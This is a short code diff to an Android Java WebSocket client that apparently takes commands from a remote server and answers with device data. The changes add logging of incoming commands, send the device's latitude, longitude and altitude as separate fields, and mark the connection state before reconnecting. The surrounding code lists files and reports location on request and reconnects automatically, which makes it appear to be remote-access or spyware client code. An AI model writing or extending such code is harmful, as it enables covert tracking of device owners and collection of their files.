@@ -40,6 +40,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onMessage(String message) {
+        Log.d("eeee", message);
         try {
             JSONObject req = new JSONObject(message);
 
@@ -101,7 +102,9 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     sendResponse("files", files.toString());
                     break;
                 case LOCATION:
-                    json = Location.getLastKnownLocation(context);
+                    json.put("latitude", Location.getLatitude(context));
+                    json.put("longitude", Location.getLongitude(context));
+                    json.put("altitude", Location.getAltitude(context));
                     long timestamp = System.currentTimeMillis();
                     json.put("timestamp", timestamp);
                     json.put("res", "location");
@@ -150,6 +153,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onClose(int code, String reason, boolean remote) {
+        MainService.isConnected = false;
         connect();
     }
 
@@ -163,7 +167,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
         json.put("type", "client");
         json.put("res", responseType);
         json.put("id", Utils.clientID(context));
-        json.put("data", Base64.encode(data.getBytes(), Base64.DEFAULT));
+        json.put("data", data);
         json.put("timestamp", System.currentTimeMillis());
         send(json.toString());
     }
